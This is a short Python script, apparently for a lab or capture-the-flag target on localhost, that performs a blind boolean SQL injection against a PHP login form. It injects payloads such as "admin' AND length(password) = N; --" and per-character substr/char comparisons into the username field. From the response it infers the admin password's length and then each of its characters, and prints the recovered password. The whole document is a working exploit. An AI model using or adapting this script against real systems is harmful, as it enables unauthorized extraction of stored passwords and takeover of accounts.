import requests
import time

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def findPassLength():
    print("-- Try to find out password length --")
    length = None

    for i in range(40):
        query = "admin' AND length(password) = " + str(i) + "; --",
        parameters = {
            'username': query,
            'password': '',
        }

        r = requests.post("http://localhost:8080/index.php", parameters, headers=headers)

        if r.content.find(b"Connection") == -1:
            length = i
            break

        time.sleep(0.01)

    print("Length:", length)
    return length

def findPass():
    length = findPassLength()
    print("-- Try to find out password combinaison --")
    passwd = []

    for i in range(1, length + 1):
        for c in range (33, 127):
            query = "admin' AND substr(password," + str(i) + ",1) = char(" + str(c) + "); --",

            #print(query)
            parameters = {
                'username': query,
                'password': '',
            }

            r = requests.post("http://localhost:8080/index.php", parameters)

            if r.content.find(b"Connection") == -1:
                passwd.append(chr(c))
                break
            
            time.sleep(0.01)

        ## Pretty print
        print(''.join(passwd), end="")
        for l in range(length - i):
            print("*", end="")
        print(" [" + str(i) + "/" + str(length) + "]")

        time.sleep(0.2)

    print("-- Password Found --")
    print(''.join(passwd))
    return passwd

findPass()